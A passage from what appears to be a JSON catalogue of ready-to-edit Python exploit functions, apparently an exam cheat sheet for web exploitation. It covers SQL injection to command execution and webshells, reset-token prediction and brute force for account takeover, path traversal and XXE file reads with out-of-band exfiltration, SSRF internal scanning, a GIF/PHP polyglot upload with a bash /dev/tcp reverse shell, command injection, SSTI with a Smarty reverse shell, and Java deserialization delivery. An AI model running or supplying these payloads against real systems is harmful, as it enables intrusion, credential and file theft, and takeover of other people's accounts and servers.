timeout=cfg.timeout)\n    debug(cfg, \"union\", r.status_code, r.text[:300])\n    m = re.search(MARKER_REGEX, r.text, re.S)\n    check(m, \"marker not found\")\n    out = m.group(1)\n    print(\"[+] dumped:\", out)\n    return save_loot(\"union_dump.txt\", out)\n"},{"id":"postgres-copy-program","title":"PostgreSQL - COPY PROGRAM / file primitive","category":"SQLi","kind":"function","functionName":"postgres_copy_program","call":"postgres_copy_program(session, cfg)","summary":"Monta payloads COPY TO/FROM PROGRAM/File para stacked SQLi.","useWhen":"PostgreSQL stacked query permite `; COPY ... PROGRAM ...`.","editFirst":["MODE","COMMAND","FILE_PATH","TABLE_EXPR","INJECT"],"aliases":["COPY TO PROGRAM","COPY FROM PROGRAM","Postgres","stacked","wget","bash"],"code":"def postgres_copy_program(session, cfg):\n    MODE = \"program\"                      # EDIT read | write | program | program_from\n    FILE_PATH = \"/tmp/out.txt\"            # EDIT\n    COMMAND = f\"wget -qO- {callback_url(cfg, 'hit')}\"  # EDIT\n    TABLE_EXPR = \"SELECT current_database()\"           # EDIT\n\n    def dollar_quote(s):\n        tag = \"$oswe$\"\n        return tag + s.replace(tag, \"\") + tag\n\n    if MODE == \"read\":\n        sql = f\"COPY ({TABLE_EXPR}) TO {dollar_quote(FILE_PATH)}\"\n    elif MODE == \"write\":\n        sql = f\"COPY ({TABLE_EXPR}) TO {dollar_quote(FILE_PATH)}\"\n    elif MODE == \"program\":\n        sql = f\"COPY ({TABLE_EXPR}) TO PROGRAM {dollar_quote(COMMAND)}\"\n    elif MODE == \"program_from\":\n        sql = f\"CREATE TEMP TABLE oswe_cmd(line text); COPY oswe_cmd FROM PROGRAM {dollar_quote(COMMAND)}\"\n    else:\n        fail(\"bad MODE\")\n\n    payload = f\"'; {sql};-- -\"\n    print(payload)\n    return payload\n"},{"id":"mysql-general-log-webshell","title":"MySQL - general_log webshell","category":"SQLi","kind":"function","functionName":"mysql_general_log_webshell_payloads","call":"mysql_general_log_webshell_payloads()","summary":"Gera statements para escrever webshell via general_log_file.","useWhen":"MySQL stacked SQLi com FILE privilege e webroot conhecido.","editFirst":["WEBROOT_PATH","SHELL_CODE"],"aliases":["mysql","general_log","general_log_file","INTO OUTFILE","webshell"],"code":"def mysql_general_log_webshell_payloads():\n    WEBROOT_PATH = \"/var/www/html/shell.php\"  # EDIT\n    SHELL_CODE = \"<?php system($_GET['cmd'] ?? 'id'); ?>\"  # EDIT\n    statements = [\n        \"SET GLOBAL general_log = 'ON'\",\n        f\"SET GLOBAL general_log_file = '{WEBROOT_PATH}'\",\n        f\"SELECT '{SHELL_CODE}'\",\n        \"SET GLOBAL general_log = 'OFF'\",\n    ]\n    for sqli in statements:\n        print(\"'; \" + sqli + \";-- -\")\n    return statements\n"},{"id":"reset-token-via-sqli","title":"Token - reset takeover via SQLi","category":"Token","kind":"function","functionName":"reset_token_via_sqli","call":"reset_token_via_sqli(session, cfg)","summary":"Usa SQLi ja confirmada para ler reset token e definir nova password.","useWhen":"Consegues dump de tabela reset_tokens/users e ha fluxo de password reset.","editFirst":["TOKEN_QUERY","CONFIRM_PATH","CONFIRM_DATA"],"aliases":["password reset","reset token","takeover","SQLi","admin"],"code":"def reset_token_via_sqli(session, cfg):\n    TOKEN_QUERY = \"SELECT token FROM password_resets WHERE username='admin' ORDER BY id DESC LIMIT 1\"  # EDIT\n    CONFIRM_PATH = \"/reset/confirm\"       # EDIT\n    NEW_PASSWORD = cfg.password           # EDIT\n\n    print(\"[*] dump this query with your SQLi extractor:\")\n    print(TOKEN_QUERY)\n    token = input(\"paste reset token: \").strip()  # exam: replace input with your dump function\n    check(token, \"missing token\")\n\n    data = {\n        \"token\": token,                   # EDIT field names\n        \"password\": NEW_PASSWORD,\n        \"password_confirm\": NEW_PASSWORD,\n    }\n    r = session.post(url(cfg, CONFIRM_PATH), data=data, timeout=cfg.timeout)\n    debug(cfg, \"reset confirm\", r.status_code, r.text[:200])\n    check(r.status_code in (200, 302), \"reset failed\")\n    print(\"[+] password reset submitted\")\n    return token\n"},{"id":"java-random-base62-token","title":"Token - Java Random base62 time window","category":"Token","kind":"function","functionName":"java_random_base62_tokens","call":"tokens = java_random_base62_tokens(start_ms, stop_ms)","summary":"Replica java.util.Random(seed_ms) e gera tokens base62.","useWhen":"Source mostra `new Random(System.currentTimeMillis())` e base62.","editFirst":["ALPHABET","LENGTH"],"aliases":["java.util.Random","currentTimeMillis","base62","seed","JVM token"],"code":"def java_random_base62_tokens(start_ms, stop_ms):\n    ALPHABET = \"0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\"  # EDIT\n    LENGTH = 40                                                                  # EDIT\n\n    class JavaRandom:\n        MULT = 0x5DEECE66D\n        ADD = 0xB\n        MASK = (1 << 48) - 1\n        def __init__(self, seed):\n            self.seed = (int(seed) ^ self.MULT) & self.MASK\n        def next(self, bits):\n            self.seed = (self.seed * self.MULT + self.ADD) & self.MASK\n            return self.seed >> (48 - bits)\n        def next_int(self, bound):\n            while True:\n                bits = self.next(31)\n                val = bits % bound\n                if bits - val + (bound - 1) >= 0:\n                    return val\n\n    tokens = []\n    for seed in range(int(start_ms), int(stop_ms) + 1):\n        rnd = JavaRandom(seed)\n        token = \"\".join(ALPHABET[rnd.next_int(len(ALPHABET))] for _ in range(LENGTH))\n        tokens.append(token)\n    save_loot(\"java_tokens.txt\", \"\\n\".join(tokens))\n    return tokens\n"},{"id":"java-xor-b64-token","title":"Token - Java time seeded XOR base64","category":"Token","kind":"function","functionName":"java_xor_b64_tokens","call":"tokens = java_xor_b64_tokens(start_ms, stop_ms, user_id=1)","summary":"Replica token Java: Random(seed), charset, XOR userId, base64 URL-safe.","useWhen":"Source mostra char random XOR com userId antes de Base64.","editFirst":["CHARSET","LENGTH"],"aliases":["xor","Base64","withoutPadding","userId","magic link","seed"],"code":"def java_xor_b64_tokens(start_ms, stop_ms, user_id):\n    CHARSET = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()\"  # EDIT\n    LENGTH = 42                                                                              # EDIT\n\n    class JavaRandom:\n        MULT = 0x5DEECE66D\n        ADD = 0xB\n        MASK = (1 << 48) - 1\n        def __init__(self, seed):\n            self.seed = (int(seed) ^ self.MULT) & self.MASK\n        def next(self, bits):\n            self.seed = (self.seed * self.MULT + self.ADD) & self.MASK\n            return self.seed >> (48 - bits)\n        def next_int(self, bound):\n            while True:\n                bits = self.next(31)\n                val = bits % bound\n                if bits - val + (bound - 1) >= 0:\n                    return val\n\n    out = []\n    for seed in range(int(start_ms), int(stop_ms) + 1):\n        rnd = JavaRandom(seed)\n        raw = \"\".join(CHARSET[rnd.next_int(len(CHARSET))] for _ in range(LENGTH)).encode()\n        enc = bytes([b ^ (user_id & 0xff) for b in raw])\n        out.append(base64.urlsafe_b64encode(enc).decode().rstrip(\"=\"))\n    save_loot(\"java_xor_b64_tokens.txt\", \"\\n\".join(out))\n    return out\n"},{"id":"php-srand-token-window","title":"Token - PHP srand time window","category":"Token","kind":"function","functionName":"php_srand_token_commands","call":"php_srand_token_commands(start_ms, stop_ms)","summary":"Gera PHP helper para tokens baseados em srand(seed).","useWhen":"Source PHP usa srand(round(microtime(true)*1000)) e rand().","editFirst":["CHARS","LENGTH"],"aliases":["PHP","srand","microtime","rand","token.php","mt_rand"],"code":"def php_srand_token_commands(start_ms, stop_ms):\n    CHARS = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_\"  # EDIT\n    LENGTH = 32                                                                # EDIT\n    php = f'''<?php\nfunction generateToken($seed) {{\n    srand($seed);\n    $chars = \"{CHARS}\";\n    $ret = \"\";\n    for ($i = 0; $i < {LENGTH}; $i++) {{\n        $ret .= $chars[rand(0, strlen($chars) - 1)];\n    }}\n    return $ret;\n}}\nfor ($seed = intval($argv[1]); $seed <= intval($argv[2]); $seed++) {{\n    echo generateToken($seed) . PHP_EOL;\n}}\n?>'''\n    save_loot(\"token.php\", php)\n    print(f\"php loot/token.php {int(start_ms)} {int(stop_ms)} > loot/php_tokens.txt\")\n    return php\n"},{"id":"token-server-date-window","title":"Token - server Date seed window","category":"Token","kind":"function","functionName":"get_server_date_seed_window","call":"start_ms, stop_ms, r = get_server_date_seed_window(session, cfg)","summary":"Triggers an action and returns a millisecond seed window using the response Date header when available.","useWhen":"Token/reset code is seeded from server time and the HTTP Date header is closer than local clock time.","editFirst":["PATH","DATA","METHOD","SKEW_MS"],"aliases":["Date header","parsedate_to_datetime","server time","seed","currentTimeMillis","forgot password","reset token"],"code":"def get_server_date_seed_window(session, cfg):\n    import time\n    from email.utils import parsedate_to_datetime\n\n    # Use when: reset token seed depends on server-side current time.\n    # Edit first: PATH, DATA, METHOD, SKEW_MS.\n    # Run before token generator: start_ms, stop_ms, _ = get_server_date_seed_window(session, cfg)\n    PATH = \"/forgotpassword.php\"           # EDIT action that creates token\n    METHOD = \"POST\"                       # EDIT POST | GET\n    DATA = {\"username\": cfg.username}      # EDIT form/query fields\n    SKEW_MS = 1000                         # EDIT widen if clocks/network jitter\n\n    local_start = int(time.time() * 1000)\n    if METHOD.upper() == \"GET\":\n        r = session.get(url(cfg, PATH), params=DATA, timeout=cfg.timeout)\n    else:\n        r = session.post(url(cfg, PATH), data=DATA, timeout=cfg.timeout)\n    local_stop = int(time.time() * 1000)\n\n    date_hdr = r.headers.get(\"Date\")\n    if date_hdr:\n        try:\n            server_ms = int(parsedate_to_datetime(date_hdr).timestamp() * 1000)\n            start_ms, stop_ms = server_ms - SKEW_MS, server_ms + SKEW_MS\n            print(\"[+] server Date:\", date_hdr, \"=>\", server_ms)\n            print(\"[+] seed window:\", start_ms, stop_ms)\n            return start_ms, stop_ms, r\n        except Exception as e:\n            debug(cfg, \"bad Date header\", date_hdr, e)\n\n    start_ms, stop_ms = local_start - SKEW_MS, local_stop + SKEW_MS\n    print(\"[+] local seed window:\", start_ms, stop_ms)\n    return start_ms, stop_ms, r\n"},{"id":"token-reset-candidate-verifier","title":"Token - reset candidate verifier","category":"Token","kind":"function","functionName":"verify_reset_token_candidates","call":"hit = verify_reset_token_candidates(session, cfg, candidates)","summary":"Tries reset-token candidates against the real reset flow until the password changes.","useWhen":"You already generated/dumped candidate reset tokens and need the exploit script to find the valid one.","editFirst":["RESET_PATH","TOKEN_FIELD","SUCCESS_MARKERS","FAIL_MARKERS","NEW_PASSWORD"],"aliases":["password reset","reset candidate","try_one(token)","SUCCESS_MARKER","Password changed","token verifier"],"code":"def verify_reset_token_candidates(session, cfg, candidates):\n    # Use after Date-seed tokens, SQLi dump, external token generator, or wordlist.\n    RESET_PATH = \"/reset/confirm\"         # EDIT reset submit endpoint\n    METHOD = \"POST\"                       # EDIT POST or GET\n    TOKEN_FIELD = \"token\"                 # EDIT\n    PASSWORD_FIELD = \"password\"           # EDIT\n    CONFIRM_FIELD = \"password_confirm\"    # EDIT set \"\" if not needed\n    NEW_PASSWORD = cfg.password           # EDIT password to set\n    EXTRA_DATA = {}                       # EDIT e.g. {\"username\": cfg.username}\n    SUCCESS_MARKERS = [\"Password changed\", \"reset successful\"]  # EDIT or []\n    FAIL_MARKERS = [\"invalid\", \"expired\", \"wrong token\"]        # EDIT or []\n    STATUS_OK = (200, 302)\n\n    for index, token in enumerate(candidates, 1):\n        token = str(token).strip()\n        if not token:\n            continue\n\n        data = dict(EXTRA_DATA)\n        data[TOKEN_FIELD] = token\n        data[PASSWORD_FIELD] = NEW_PASSWORD\n        if CONFIRM_FIELD:\n            data[CONFIRM_FIELD] = NEW_PASSWORD\n\n        print(f\"[*] trying {index}: {token}\")\n        if METHOD.upper() == \"GET\":\n            r = session.get(url(cfg, RESET_PATH), params=data, allow_redirects=False, timeout=cfg.timeout)\n        else:\n            r = session.post(url(cfg, RESET_PATH), data=data, allow_redirects=False, timeout=cfg.timeout)\n\n        body_l = r.text.lower()\n        if any(m.lower() in body_l for m in FAIL_MARKERS):\n            continue\n\n        marker_ok = (not SUCCESS_MARKERS) or any(m in r.text for m in SUCCESS_MARKERS)\n        if r.status_code in STATUS_OK and marker_ok:\n            print(\"[+] valid reset token:\", token)\n            return token\n\n    fail(\"no reset token candidate worked\")\n"},{"id":"path-traversal-read","title":"File - path traversal read","category":"File","kind":"function","functionName":"read_path_traversal","call":"read_path_traversal(session, cfg)","summary":"LFI/path traversal com lista de paths e markers.","useWhen":"Parametro de download/template/file inclui path controlado.","editFirst":["PATH","PARAM","FILES","WRAPPER"],"aliases":["LFI","path traversal","../","/etc/passwd","WEB-INF","config"],"code":"def read_path_traversal(session, cfg):\n    PATH = \"/download\"                    # EDIT\n    PARAM = \"file\"                        # EDIT\n    WRAPPER = \"{file}\"                    # EDIT e.g. \"../../../../..{file}\"\n    FILES = [\"/etc/passwd\", \"/proc/self/environ\", \"WEB-INF/web.xml\"]  # EDIT\n\n    hits = {}\n    for f in FILES:\n        payload = WRAPPER.format(file=f)\n        r = session.get(url(cfg, PATH), params={PARAM: payload}, timeout=cfg.timeout)\n        debug(cfg, \"file\", f, r.status_code, r.text[:120])\n        if r.status_code == 200 and r.text:\n            hits[f] = r.text\n            save_loot(\"file_\" + re.sub(r\"[^A-Za-z0-9_.-]\", \"_\", f), r.text)\n    return hits\n"},{"id":"xxe-inline-file","title":"XXE - inline file read","category":"XXE","kind":"function","functionName":"xxe_inline_file_read","call":"xxe_inline_file_read(session, cfg)","summary":"XXE simples com DOCTYPE inline e entidade file://.","useWhen":"Endpoint aceita XML e resposta mostra entidade resolvida.","editFirst":["XML_PATH","FILE_PATH","AUTH_MODE","BODY_TEMPLATE"],"aliases":["XXE","DOCTYPE","ENTITY","file://","application/xml","Basic auth"],"code":"def xxe_inline_file_read(session, cfg):\n    XML_PATH = \"/api/xml\"                  # EDIT\n    FILE_PATH = \"/etc/passwd\"              # EDIT\n    AUTH_MODE = \"session\"                  # EDIT session | basic | none\n    CONTENT_TYPE = \"application/xml\"       # EDIT\n    ENTITY_NAME = \"xxe\"                    # EDIT\n    BODY_TEMPLATE = \"\"\"<root><name>__ENTITY__</name></root>\"\"\"  # EDIT paste target XML body\n    REQUEST_AUTH = (cfg.username, cfg.password) if AUTH_MODE == \"basic\" else None\n\n    check(AUTH_MODE in (\"session\", \"basic\", \"none\"), \"bad AUTH_MODE\")\n    doctype = f'<!DOCTYPE data [<!ENTITY {ENTITY_NAME} SYSTEM \"file://{FILE_PATH}\">]>'\n    entity_ref = f\"&{ENTITY_NAME};\"\n    payload = \"<?xml version=\\\"1.0\\\"?>\\n\" + doctype + \"\\n\" + BODY_TEMPLATE.replace(\"__ENTITY__\", entity_ref)\n\n    r = session.post(url(cfg, XML_PATH), data=payload, headers={\"Content-Type\": CONTENT_TYPE},\n                     auth=REQUEST_AUTH, timeout=cfg.timeout)\n    debug(cfg, \"xxe\", r.status_code, r.text[:300])\n    check(r.status_code != 401, \"401: try AUTH_MODE='basic'\")\n    print(r.text[:1000])\n    return r.text\n"},{"id":"xxe-external-dtd","title":"XXE - external DTD OOB","category":"XXE","kind":"function","functionName":"xxe_external_dtd_oob","call":"xxe_external_dtd_oob(session, cfg)","summary":"Serve DTD externo e envia XML que chama teu callback.","useWhen":"Inline nao mostra output ou file tem chars que quebram XML.","editFirst":["XML_PATH","FILE_PATH","DTD_NAME","BODY_TEMPLATE"],"aliases":["XXE OOB","external DTD","parameter entity","CDATA","callback"],"code":"def xxe_external_dtd_oob(session, cfg):\n    XML_PATH = \"/api/xml\"                  # EDIT\n    FILE_PATH = \"/etc/passwd\"              # EDIT\n    DTD_NAME = \"xxe.dtd\"                   # EDIT\n    BODY_TEMPLATE = \"\"\"<root><name>&send;</name></root>\"\"\"  # EDIT injection point\n    CONTENT_TYPE = \"application/xml\"       # EDIT\n\n    def serve_file(content, filename, port):\n        import http.server\n        import threading\n        if isinstance(content, str):\n            content = content.encode()\n        class Handler(http.server.BaseHTTPRequestHandler):\n            def do_GET(self):\n                if os.path.basename(self.path.split(\"?\")[0]) != filename:\n                    self.send_error(404)\n                    return\n                self.send_response(200)\n                self.send_header(\"Content-Length\", str(len(content)))\n                self.end_headers()\n                self.wfile.write(content)\n            def log_message(self, fmt, *args):\n                pass\n        server = http.server.HTTPServer((\"0.0.0.0\", int(port)), Handler)\n        threading.Thread(target=server.serve_forever, daemon=True).start()\n        print(f\"[+] serving {filename} on {port}\")\n        return server\n\n    dtd = f'''<!ENTITY % file SYSTEM \"file://{FILE_PATH}\">\n<!ENTITY % eval \"<!ENTITY send SYSTEM '{server_url(cfg, \"leak?x=%file;\")}'>\">\n%eval;'''\n    serve_file(dtd, DTD_NAME, cfg.server_port or cfg.lport or 8081)\n\n    payload = f'''<?xml version=\"1.0\"?>\n<!DOCTYPE data [\n<!ENTITY % remote SYSTEM \"{server_url(cfg, DTD_NAME)}\">\n%remote;\n]>\n{BODY_TEMPLATE}'''\n    r = session.post(url(cfg, XML_PATH), data=payload, headers={\"Content-Type\": CONTENT_TYPE}, timeout=cfg.timeout)\n    debug(cfg, \"xxe dtd\", r.status_code, r.text[:200])\n    return r.text\n"},{"id":"ssrf-json-port-scan","title":"SSRF - JSON port scan","category":"SSRF","kind":"function","functionName":"ssrf_json_port_scan","call":"ssrf_json_port_scan(session, cfg)","summary":"Faz POST SSRF para testar portas internas e distinguir mensagens.","useWhen":"Endpoint recebe JSON {url: ...} e retorna erro diferente por porta.","editFirst":["SSRF_PATH","HOST","PORTS","JSON_FIELD","OPEN_MARKERS","CLOSED_MARKERS"],"aliases":["SSRF","port scan","ECONNREFUSED","socket hang up","internal","172."],"code":"def ssrf_json_port_scan(session, cfg):\n    SSRF_PATH = \"/api/fetch\"               # EDIT\n    JSON_FIELD = \"url\"                     # EDIT\n    HOST = \"http://127.0.0.1\"              # EDIT internal host\n    PORTS = [22, 80, 443, 8000, 8001, 8080, 8443, 9000]  # EDIT\n    OPEN_MARKERS = [\"permission\", \"404\", \"Unauthorized\", \"socket hang up\"]  # EDIT\n    CLOSED_MARKERS = [\"ECONNREFUSED\", \"Connection refused\"]                  # EDIT\n\n    for port in PORTS:\n        target = f\"{HOST}:{port}\"\n        try:\n            r = session.post(url(cfg, SSRF_PATH), json={JSON_FIELD: target}, timeout=cfg.timeout)\n            body = r.text\n            if any(m in body for m in OPEN_MARKERS):\n                print(port, \"OPEN-ish\", body[:120])\n            elif any(m in body for m in CLOSED_MARKERS):\n                print(port, \"closed\")\n            else:\n                print(port, r.status_code, body[:120])\n        except requests.exceptions.Timeout:\n            print(port, \"timeout\")\n"},{"id":"ssrf-subnet-scan","title":"SSRF - internal 172 subnet scan","category":"SSRF","kind":"function","functionName":"ssrf_172_subnet_scan","call":"ssrf_172_subnet_scan(session, cfg)","summary":"Varre 172.X.Y.1:PORT via SSRF.","useWhen":"Precisas encontrar servico interno em Docker/K8s subnet.","editFirst":["SSRF_PATH","TWO_START","TWO_STOP","PORT"],"aliases":["172","docker","subnet","port 8000","ssrf scan"],"code":"def ssrf_172_subnet_scan(session, cfg):\n    SSRF_PATH = \"/api/fetch\"               # EDIT\n    JSON_FIELD = \"url\"                     # EDIT\n    TWO_START = 16                         # EDIT first 172.<two>\n    TWO_STOP = 32                          # EDIT stop exclusive\n    PORT = 8000                            # EDIT\n\n    for two in range(TWO_START, TWO_STOP):\n        for three in range(1, 256):\n            host = f\"http://172.{two}.{three}.1:{PORT}\"\n            print(\"Trying\", host)\n            try:\n                r = session.post(url(cfg, SSRF_PATH), json={JSON_FIELD: host}, timeout=cfg.timeout)\n                if r.status_code not in (400, 401, 403, 404, 502) or \"ECONNREFUSED\" not in r.text:\n                    print(\"[hit]\", host, r.status_code, r.text[:160])\n            except requests.exceptions.Timeout:\n                print(\"[timeout]\", host)\n"},{"id":"upload-webshell","title":"Upload - multipart webshell from Burp","category":"Upload","kind":"function","functionName":"upload_webshell","call":"shell_url = upload_webshell(session, cfg)","summary":"Builds a small GIF/PHP polyglot upload with requests files= tuples.","useWhen":"The upload checks image type with getimagesize() but executes .phar/.php as PHP.","editFirst":["UPLOAD_PATH","FILE_FIELD","FILENAME","MIME_TYPE","TITLE","PHP_CODE","ALLOW_REDIRECTS","--lhost","--lport","SHELL_URL"],"aliases":["upload","multipart","webshell","reverse shell","lhost","lport","/dev/tcp","Burp","Reissue","Copy as curl","files","GIF87a","image/gif","PHAR","getimagesize","php_offset","PHP_OK","Docker bridge",".php",".jsp",".aspx"],"code":"def upload_webshell(session, cfg):\n    # Use when: image upload accepts GIF bytes and server executes .phar/.php as PHP.\n    # Edit first: copy field names, filename and MIME type from the Burp multipart.\n    # Run: python3 exploit.py -t http://target --lhost ATTACKER_IP --lport 4444\n    # main.py use: start listen_tcp_once(cfg), upload, then trigger SHELL_URL.\n    UPLOAD_PATH = \"/admin/upload_image.php\" # EDIT POST path from Burp\n    FILE_FIELD = \"image\"                   # EDIT name=\"image\"\n    FILENAME = \"image.phar\"                # EDIT filename=\"image.phar\"\n    MIME_TYPE = \"image/gif\"                # EDIT Content-Type of the file part\n    TITLE = \"POC\"                          # EDIT title field value; \"\" if Burp used empty\n    SHELL_URL = f\"/images/{FILENAME}\"      # EDIT reachable path after upload\n    SUCCESS_CODES = (302, 200, 201)        # EDIT\n    ALLOW_REDIRECTS = False                # EDIT False keeps Burp-like 302 response\n\n    check(cfg.lhost and cfg.lport, \"set --lhost and --lport\")\n    if cfg.lhost in (\"127.0.0.1\", \"localhost\"):\n        print(\"[!] --lhost is loopback; inside Docker this points at the target container.\")\n        print(\"[!] Use the host/VPN/Docker bridge IP reachable from the target.\")\n\n    PHP_CODE = (\n        f\"\"\"exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{cfg.lhost}/{cfg.lport} 0>&1'\");\"\"\"\n    )                                     # EDIT raw PHP inside <?php ... ?>\n    # Quick visible test: PHP_CODE = 'echo \"PHP_OK\";'\n    blob = b\"GIF87a<?php \" + PHP_CODE.encode() + b\" ?>\"\n    check(blob.startswith(b\"GIF87a\"), \"base image is not GIF\")\n    check(b\"<?php\" in blob, \"PHP tag was not appended\")\n    php_offset = blob.index(b\"<?php\")\n    print(\"[+] payload bytes: total\", len(blob), \"php_offset\", php_offset)\n    print(\"[i] GET .phar will not show PHP source when Apache/PHP interprets it; check the upload POST in Burp.\")\n\n    # Same requests shape as: files = {\"uploaded_file\": (\"phpinfo.php\", b\"<?php phpinfo() ?>\", \"application/x-httpd-php\")}\n    files = {\n        \"title\": (None, TITLE),\n        FILE_FIELD: (FILENAME, blob, MIME_TYPE)\n    }\n    r = session.post(\n        url(cfg, UPLOAD_PATH),\n        files=files,\n        allow_redirects=ALLOW_REDIRECTS,\n        timeout=cfg.timeout,\n    )\n    debug(cfg, \"upload\", r.status_code, r.text[:250])\n    check(r.status_code in SUCCESS_CODES, \"upload failed\")\n    print(\"[+] shell candidate:\", url(cfg, SHELL_URL))\n    return url(cfg, SHELL_URL)\n"},{"id":"run-webshell","title":"RCE - webshell runner","category":"RCE","kind":"function","functionName":"run_webshell_cmd","call":"run_webshell_cmd(session, cfg, 'id')","summary":"Executa comandos em webshell HTTP.","useWhen":"Ja tens shell.php?cmd= ou equivalente.","editFirst":["SHELL_PATH","CMD_PARAM","MARKER_REGEX"],"aliases":["webshell","cmd","shell.php","run_cmd","whoami"],"code":"def run_webshell_cmd(session, cfg, cmd):\n    SHELL_PATH = \"/uploads/shell.php\"      # EDIT\n    CMD_PARAM = \"cmd\"                      # EDIT\n    MARKER_REGEX = None                    # EDIT optional r\"START(.*?)END\"\n\n    r = session.get(url(cfg, SHELL_PATH), params={CMD_PARAM: cmd}, timeout=cfg.timeout)\n    debug(cfg, \"webshell\", r.status_code, r.text[:300])\n    check(r.status_code == 200, \"webshell bad status\")\n    out = r.text\n    if MARKER_REGEX:\n        m = re.search(MARKER_REGEX, out, re.S)\n        check(m, \"marker not found\")\n        out = m.group(1)\n    print(out.strip())\n    return out\n"},{"id":"cmd-injection-runner","title":"RCE - command injection runner","category":"RCE","kind":"function","functionName":"run_cmd_injection","call":"run_cmd_injection(session, cfg, 'id')","summary":"Mete cmd dentro de parametro vulneravel.","useWhen":"Source mostra exec/system/ProcessBuilder com input controlado.","editFirst":["PATH","PARAM","WRAPPER","METHOD"],"aliases":["command injection","system(","Runtime.exec","ProcessBuilder","cmdi"],"code":"def run_cmd_injection(session, cfg, cmd):\n    METHOD = \"GET\"                         # EDIT GET/POST\n    PATH = \"/api/ping\"                     # EDIT\n    PARAM = \"host\"                         # EDIT\n    WRAPPER = \"127.0.0.1; {cmd}; #\"        # EDIT\n\n    payload = WRAPPER.format(cmd=cmd)\n    if METHOD == \"GET\":\n        r = session.get(url(cfg, PATH), params={PARAM: payload}, timeout=cfg.timeout)\n    else:\n        r = session.post(url(cfg, PATH), data={PARAM: payload}, timeout=cfg.timeout)\n    debug(cfg, \"cmdi\", r.status_code, r.text[:300])\n    print(r.text[:1000])\n    return r.text\n"},{"id":"ssti-jinja-runner","title":"RCE - SSTI runner","category":"RCE","kind":"function","functionName":"run_ssti_cmd","call":"run_ssti_cmd(session, cfg, 'id')","summary":"Template injection command runner com payload editavel.","useWhen":"Source renderiza template com input controlado.","editFirst":["PATH","PARAM","PAYLOAD_TEMPLATE"],"aliases":["SSTI","Jinja","Freemarker","Velocity","Smarty","{{","${","{php}","popen","fsockopen","proc_open"],"code":"def run_ssti_cmd(session, cfg, cmd):\n    PATH = \"/render\"                       # EDIT\n    PARAM = \"template\"                     # EDIT\n    PAYLOAD_TEMPLATE = \"{{ cycler.__init__.__globals__.os.popen('__CMD__').read() }}\"  # EDIT\n    # Smarty/PHP variant: '{php}system(\"__CMD__\");{/php}'\n\n    payload = PAYLOAD_TEMPLATE.replace(\"__CMD__\", cmd.replace(\"'\", \"\\\\'\"))\n    r = session.post(url(cfg, PATH), data={PARAM: payload}, timeout=cfg.timeout)\n    debug(cfg, \"ssti\", r.status_code, r.text[:300])\n    print(r.text[:1000])\n    return r.text\n"},{"id":"ssti-stored-plant-trigger","title":"RCE - stored SSTI plant and trigger","category":"RCE","kind":"function","functionName":"stored_ssti_plant_trigger","call":"stored_ssti_plant_trigger(session, cfg)","summary":"Plants an SSTI payload in one request and triggers template rendering in another request.","useWhen":"Payload is stored in profile/MOTD/name/etc and executes only when a second page renders it.","editFirst":["PLANT_PATH","PLANT_FIELD","TRIGGER_PATH","PAYLOAD_TEMPLATE","REVERSE_SHELL"],"aliases":["SSTI","stored SSTI","plant trigger","Smarty","{php}","fsockopen","proc_open","profile render"],"code":"def stored_ssti_plant_trigger(session, cfg):\n    # Use when: one endpoint stores template text and another endpoint renders it.\n    PLANT_METHOD = \"POST\"                 # EDIT POST or GET\n    PLANT_PATH = \"/profile\"               # EDIT endpoint that stores user-controlled template\n    PLANT_FIELD = \"template\"              # EDIT vulnerable/stored field\n    EXTRA_DATA = {}                       # EDIT other required form/query fields\n    TRIGGER_METHOD = \"GET\"                # EDIT GET or POST\n    TRIGGER_PATH = \"/profile\"             # EDIT endpoint that renders stored value\n    TRIGGER_DATA = None                   # EDIT optional params/form\n\n    REVERSE_SHELL = False                 # EDIT True for callback payload\n    CMD = \"id\"                            # EDIT command when REVERSE_SHELL=False\n    PAYLOAD_TEMPLATE = \"{{ cycler.__init__.__globals__.os.popen('__CMD__').read() }}\"  # EDIT engine\n    SMARTY_REVSHELL = \"{php}$sock=fsockopen('__LHOST__',__LPORT__);$proc=proc_open('/bin/sh -i',array(0=>$sock,1=>$sock,2=>$sock),$pipes);{/php}\"\n\n    if REVERSE_SHELL:\n        require_callback(cfg)\n        payload = SMARTY_REVSHELL.replace(\"__LHOST__\", cfg.lhost).replace(\"__LPORT__\", str(cfg.lport))\n    else:\n        payload = PAYLOAD_TEMPLATE.replace(\"__CMD__\", CMD.replace(\"'\", \"\\\\'\"))\n\n    plant_data = dict(EXTRA_DATA)\n    plant_data[PLANT_FIELD] = payload\n\n    if PLANT_METHOD.upper() == \"GET\":\n        planted = session.get(url(cfg, PLANT_PATH), params=plant_data, timeout=cfg.timeout)\n    else:\n        planted = session.post(url(cfg, PLANT_PATH), data=plant_data, timeout=cfg.timeout)\n    print(\"[+] planted SSTI payload\", planted.status_code, \"len\", len(planted.text))\n\n    try:\n        if TRIGGER_METHOD.upper() == \"POST\":\n            triggered = session.post(url(cfg, TRIGGER_PATH), data=TRIGGER_DATA, timeout=cfg.timeout)\n        else:\n            triggered = session.get(url(cfg, TRIGGER_PATH), params=TRIGGER_DATA, timeout=cfg.timeout)\n        print(\"[+] triggered render\", triggered.status_code, \"len\", len(triggered.text))\n        print(triggered.text[:1000])\n        return triggered\n    except requests.exceptions.ReadTimeout:\n        print(\"[+] trigger timed out; callback may be connected\")\n        return None\n"},{"id":"deser-java-delivery","title":"Deser - Java serialized delivery","category":"Deser","kind":"function","functionName":"deliver_java_serialized_payload","call":"deliver_java_serialized_payload(session, cfg)","summary":"Entrega payload Java serialized gerado fora (ysoserial/etc).","useWhen":"Source chama readObject/readUnshared/XMLDecoder/XStream em input controlado.","editFirst":["PATH","PARAM_MODE","PAYLOAD_FILE","CONTENT_TYPE"],"aliases":["readObject","ysoserial","Java deserialization","base64","application/x-java-serialized-object"],"code":"def deliver_java_serialized_payload(session, cfg):\n    PATH = \"/api/import\"                   # EDIT\n    PARAM_MODE = \"body\"                    # EDIT body | file | form_b64\n    PAYLOAD_FILE = \"payload.bin\"           # EDIT generated payload\n    CONTENT_TYPE = \"application/x-java-serialized-object\"  # EDIT\n\n    blob = open(PAYLOAD_FILE, \"rb\").read()\n    if PARAM_MODE == \"body\":\n        r = session.post(url(cfg, PATH), data=blob, headers={\"Content-Type\": CONTENT_TYPE}, timeout=cfg.timeout)\n    elif 